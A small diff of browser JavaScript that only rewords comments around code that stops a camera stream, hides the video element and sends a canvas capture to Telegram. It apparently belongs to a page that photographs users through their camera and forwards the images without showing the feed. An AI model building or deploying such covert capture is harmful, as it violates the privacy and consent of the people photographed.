@@ -139,8 +139,8 @@
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
 
-            // Hide the video element to avoid showing it during the second scan
-            video.style.display = "none";
+            // Hide the video element entirely to avoid showing it
+            video.style.display = "none"; // Hide the video element immediately
 
             sendToTelegram(canvas, step);
         }
